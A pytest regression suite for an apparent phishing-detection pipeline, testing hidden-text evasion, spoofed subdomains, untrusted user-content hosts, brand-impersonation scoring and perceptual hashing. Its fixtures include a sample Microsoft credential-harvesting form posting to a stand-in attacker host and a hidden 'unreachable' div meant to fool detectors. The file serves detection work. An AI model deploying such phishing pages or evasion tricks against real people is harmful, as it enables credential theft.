"""
Regression Tests for Phase 2: Detection Logic Hardening.
Tests:
2.1 "Unreachable" cannot be triggered by page text (<div style="display:none">could not reach target host</div> must score PHISHING >= 0.85).
2.2 Hard trusted-domain override removed:
    - User content hosts (sites.google.com, github.io, pages.dev) excluded from trust.
    - Phishing on sites.google.com scores PHISHING/SUSPICIOUS, never SAFE.
    - tldextract prevents attacker.google.com.attacker.com bypasses.
2.3 Brand impersonation compares against actual registrable domains:
    - Fake Microsoft on security-verify.xyz flags impersonation.
    - Authentic Microsoft on login.microsoftonline.com is recognized as authentic.
2.4 Scoring cascade:
    - Rules are logged in fired_rules.
    - Signal agreement calibrated across modalities.
2.5 Visual analysis:
    - Perceptual dHash computed.
    - Synthetic previews clearly labeled with is_synthetic_preview.
"""
from pathlib import Path
from unittest.mock import MagicMock, patch
import pytest
from PIL import Image

from backend.analyzer.fusion import MultimodalFusionEngine
from backend.analyzer.pipeline import PhishingDetectionPipeline
from backend.analyzer.vlm_analyzer import (
    DOMBrandDiscrepancyVisualAnalyzer,
    compute_perceptual_difference_hash,
)
from backend.config import BACKEND_DIR
from backend.security.html_features import extract_html_features
from backend.security.trusted_domains import (
    get_registrable_domain,
    is_trusted_domain,
    is_user_content_host,
    parse_domain_parts,
)
from backend.security.url_features import extract_url_features


# ==============================================================================
# PHASE 2.1: "Unreachable" Bypass Prevention
# ==============================================================================

def test_unreachable_not_triggered_by_hidden_page_text():
    """
    A page that contains '<div style="display:none">could not reach target host</div>'
    must NOT be marked is_unreachable when HTTP status is 200, and must classify as PHISHING (score >= 0.85).
    """
    test_page_file = BACKEND_DIR / "test_pages" / "fake_login_page.html"
    base_html = test_page_file.read_text(encoding="utf-8")

    # Inject bypass payload
    malicious_html = base_html + '<div style="display:none">could not reach target host or offline</div>'

    pipeline = PhishingDetectionPipeline()

    # Mock webpage capture returning 200 with the injected HTML
    with patch("backend.analyzer.pipeline.capture_webpage") as mock_cap:
        mock_cap.return_value = (
            Image.new("RGB", (1280, 800), color=(255, 255, 255)),
            malicious_html,
            "data:image/png;base64,dummy",
            0,
            False,  # is_unreachable is False because HTTP 200 was received
            ""
        )
        with patch("backend.analyzer.pipeline.validate_url_security", return_value=(True, "Safe")):
            result = pipeline.analyze_url("https://login.microsoftonline.security-verify.xyz/login")

    assert result["is_unreachable"] is False, "A reachable page returning 200 must never be marked unreachable."
    assert result["classification"] == "PHISHING", f"Expected PHISHING, got {result['classification']}"
    assert result["risk_score"] >= 0.85, f"Expected risk_score >= 0.85, got {result['risk_score']}"


# ==============================================================================
# PHASE 2.2: Trusted Domains & User-Content Isolation via tldextract
# ==============================================================================

def test_tldextract_registrable_domain_parsing():
    """Verify tldextract accurately parses registrable domains and handles subdomains."""
    subdomain, domain, suffix, reg_domain = parse_domain_parts("https://login.microsoftonline.security-verify.xyz/auth")
    assert reg_domain == "security-verify.xyz"
    assert domain == "security-verify"
    assert suffix == "xyz"

    # Attacker attempting to spoof google via subdomain suffix
    _, _, _, spoof_domain = parse_domain_parts("https://google.com.attacker-controlled.net/login")
    assert spoof_domain == "attacker-controlled.net"
    assert not is_trusted_domain("https://google.com.attacker-controlled.net/login")


def test_user_content_hosts_excluded_from_trust():
    """User-content and free hosting platforms must never be granted trusted domain status."""
    user_content_urls = [
        "https://my-company-login.sites.google.com/view/portal",
        "https://phish-test.github.io/login",
        "https://security-verify.pages.dev/auth",
        "https://microsoft-login.firebaseapp.com",
        "https://chase-update.vercel.app",
        "https://docs.google.com/forms/d/e/sample/viewform",
    ]
    for url in user_content_urls:
        assert is_user_content_host(url) is True, f"Host {url} should be recognized as user-content."
        assert is_trusted_domain(url) is False, f"Host {url} must NOT be trusted."


def test_phishing_on_sites_google_com_scores_phishing():
    """A credential harvesting page hosted on sites.google.com must score PHISHING or SUSPICIOUS, not SAFE."""
    target_url = "https://sites.google.com/view/microsoft-security-verification/login"
    phish_html = """
    <html>
      <head><title>Microsoft 365 Account Update</title></head>
      <body>
        <h1>Sign In to Microsoft 365</h1>
        <form action="https://attacker-harvester.com/steal" method="POST">
          <input type="email" name="login" placeholder="Email" />
          <input type="password" name="passwd" placeholder="Password" />
          <button type="submit">Verify Now</button>
        </form>
      </body>
    </html>
    """
    pipeline = PhishingDetectionPipeline()
    with patch("backend.analyzer.pipeline.capture_webpage") as mock_cap:
        mock_cap.return_value = (
            Image.new("RGB", (1280, 800), color=(255, 255, 255)),
            phish_html,
            "data:image/png;base64,dummy",
            0,
            False,
            ""
        )
        with patch("backend.analyzer.pipeline.validate_url_security", return_value=(True, "Safe")):
            result = pipeline.analyze_url(target_url)

    assert result["classification"] in ("PHISHING", "SUSPICIOUS"), f"Got {result['classification']}"
    assert result["classification"] != "SAFE", "Phishing hosted on sites.google.com must NOT be classified as SAFE."
    assert result["risk_score"] >= 0.70


# ==============================================================================
# PHASE 2.3: Registrable Domain Brand Impersonation
# ==============================================================================

def test_brand_impersonation_detection_on_unauthorized_domain():
    """Mimicking Microsoft identity on a third-party domain must flag brand impersonation."""
    analyzer = DOMBrandDiscrepancyVisualAnalyzer()
    img = Image.new("RGB", (1280, 800), color=(255, 255, 255))
    html_features = {
        "title": "Microsoft Online Account Login",
        "headings": ["Sign in to Microsoft 365"],
        "has_password_field": True,
        "has_login_form": True,
        "image_alts": ["Microsoft Logo"]
    }
    result = analyzer.analyze(
        image=img,
        webpage_text="Sign in to your account. Microsoft OneDrive document shared.",
        domain_context="security-verify.xyz",
        html_features=html_features,
        url_context="https://security-verify.xyz/login"
    )
    assert result["brand_impersonation"] is True
    assert result["impersonated_brand"] == "Microsoft / Office 365"
    assert result["credential_harvesting"] is True
    assert result["visual_risk"] >= 0.85


def test_authentic_brand_domain_not_flagged_as_impersonation():
    """An authentic brand on its official registrable domain must NOT be flagged as impersonation."""
    analyzer = DOMBrandDiscrepancyVisualAnalyzer()
    img = Image.new("RGB", (1280, 800), color=(255, 255, 255))
    html_features = {
        "title": "Sign in to your Microsoft account",
        "headings": ["Sign in"],
        "has_password_field": True,
        "has_login_form": True,
        "image_alts": ["Microsoft Logo"]
    }
    result = analyzer.analyze(
        image=img,
        webpage_text="Sign in to Microsoft account. Enter password.",
        domain_context="login.microsoftonline.com",
        html_features=html_features,
        url_context="https://login.microsoftonline.com/auth"
    )
    assert result["brand_impersonation"] is False
    assert any("Authentic brand portal" in ind for ind in result["visual_indicators"])


# ==============================================================================
# PHASE 2.4: Scoring Cascade & Calibrated Signal Agreement
# ==============================================================================

def test_scoring_cascade_logs_fired_rules():
    """Verify that MultimodalFusionEngine records audit metadata for all fired rules."""
    fusion = MultimodalFusionEngine()
    url_analysis = {"url_risk": 0.80, "features": {"brand_in_subdomain": ["microsoft"]}, "indicators": []}
    visual_analysis = {"visual_risk": 0.90, "brand_impersonation": True, "credential_harvesting": True, "visual_indicators": []}
    text_analysis = {"text_risk": 0.70, "credential_request": True, "social_engineering": True, "indicators": []}
    html_analysis = {
        "html_risk": 0.85,
        "features": {"has_password_field": True, "cross_domain_forms": ["https://exfil.net/post"]},
        "indicators": []
    }

    result = fusion.fuse(url_analysis, visual_analysis, text_analysis, html_analysis)
    assert result["classification"] == "PHISHING"
    assert result["risk_score"] >= 0.88
    assert len(result["fired_rules"]) >= 1

    rule_names = [r["rule"] for r in result["fired_rules"]]
    assert "RULE_1_BRAND_IMPERSONATION_CREDENTIAL_HARVEST" in rule_names
    assert "signal_agreement" in result
    assert 0.0 <= result["signal_agreement"] <= 1.0


# ==============================================================================
# PHASE 2.5: Visual Features & Synthetic Preview Labeling
# ==============================================================================

def test_visual_perceptual_hash_and_synthetic_label():
    """Verify that difference hash (dHash) is computed and synthetic previews are flagged."""
    img = Image.new("RGB", (1280, 800), color=(100, 150, 200))
    dhash = compute_perceptual_difference_hash(img)
    assert len(dhash) == 16
    assert isinstance(dhash, str)

    analyzer = DOMBrandDiscrepancyVisualAnalyzer()
    res = analyzer.analyze(
        image=img,
        webpage_text="Portal text",
        domain_context="example.com",
        is_synthetic=True
    )
    assert res["is_synthetic_preview"] is True
    assert any("Synthetic Fallback Preview" in ind for ind in res["visual_indicators"])

